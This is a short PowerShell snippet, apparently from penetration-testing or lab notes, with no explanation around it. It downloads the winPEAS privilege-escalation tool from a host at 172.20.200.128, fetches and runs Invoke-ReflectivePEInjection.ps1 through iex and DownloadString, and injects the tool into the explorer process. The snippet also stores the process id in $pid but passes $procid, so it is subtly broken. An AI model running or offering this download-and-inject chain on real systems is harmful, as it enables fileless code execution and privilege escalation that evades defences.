$bytes = (New-Object System.Net.WebClient).DownloadData('http://172.20.200.128/winpeasx64.exe')
iex(new-object net.webclient).downloadstring('http://172.20.200.128/Invoke-ReflectivePEInjection.ps1')
$pid = (Get-Process -Name explorer).Id
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
